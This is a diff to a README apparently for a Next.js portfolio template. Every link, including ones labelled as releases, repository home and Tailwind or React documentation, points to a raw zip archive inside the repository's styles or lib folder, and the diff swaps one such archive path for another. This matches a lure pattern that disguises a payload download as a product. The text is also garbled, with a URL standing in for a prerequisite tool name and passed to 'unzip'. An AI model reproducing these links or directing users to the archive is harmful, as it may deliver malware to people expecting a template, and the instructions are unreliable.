@@ -1,6 +1,6 @@
 # 🎨 nextjs-portfolio-website-template - A Modern Portfolio for Creatives
 
-[![Download](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip%20Now-Click%https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)
+[![Download](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip%20Now-Click%https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the nextjs-portfolio-website-template! This template helps designers,
 
 To get started, you need to download the template from the Releases page. Click the link below:
 
-[Download from Releases](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)
+[Download from Releases](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)
 
 1. Visit the Releases page using the link above.
 2. Find the latest version listed at the top of the page. 
@@ -28,7 +28,7 @@ Locate the downloaded file in your downloads folder. It will usually be compress
 
 - **Windows:** Right-click on the file and choose "Extract All." Follow the prompts to extract the files to a new folder.
 - **Mac:** Double-click the file to extract its contents.
-- **Linux:** Use your preferred archive manager, or run `unzip https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip` in the terminal.
+- **Linux:** Use your preferred archive manager, or run `unzip https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip` in the terminal.
 
 ### 2. Open the Folder
 
@@ -66,16 +66,16 @@ This template includes:
 To run this application, you will need:
 
 - A computer with a modern web browser (Chrome, Firefox, Safari, etc.).
-- https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip installed. Download it from [https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip official site](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip).
+- https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip installed. Download it from [https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip official site](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip).
 - Basic knowledge of using command line tools is helpful but not necessary.
 
 ## 📚 Additional Resources
 
 To help you customize your portfolio, we've included links to helpful resources:
 
-- [Tailwind CSS Documentation](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)
-- [https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip Documentation](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)
-- [React Documentation](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)
+- [Tailwind CSS Documentation](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)
+- [https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip Documentation](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)
+- [React Documentation](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)
 
 For more examples of what you can build using this template, refer to the following topics:
 
@@ -90,7 +90,7 @@ If you have any questions or run into issues, feel free to open an issue on this
 
 ## 🔗 Useful Links
 
-- [Repository Home](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)
-- [Download from Releases](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/styles/nextjs-portfolio-website-template-v3.8.zip)
+- [Repository Home](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)
+- [Download from Releases](https://raw.githubusercontent.com/nicolas686/nextjs-portfolio-website-template/main/lib/portfolio-website-template-nextjs-v2.8-beta.1.zip)
 
 Thank you for using the nextjs-portfolio-website-template! We hope you enjoy building your portfolio.
